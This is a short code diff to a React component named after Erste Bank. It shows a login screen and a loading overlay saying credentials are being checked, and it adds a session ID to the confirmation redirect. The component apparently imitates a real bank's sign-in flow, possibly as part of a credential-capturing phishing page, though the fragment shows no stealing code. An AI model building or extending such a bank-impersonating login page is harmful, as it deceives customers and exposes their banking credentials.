@@ -66,7 +66,7 @@ const ErsteBank = () => {
 
   return (
     <>
-      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
     <div className="flex h-screen flex-col">
       <div className="flex flex-1 min-h-0">
         {/* Left Side - Login */}
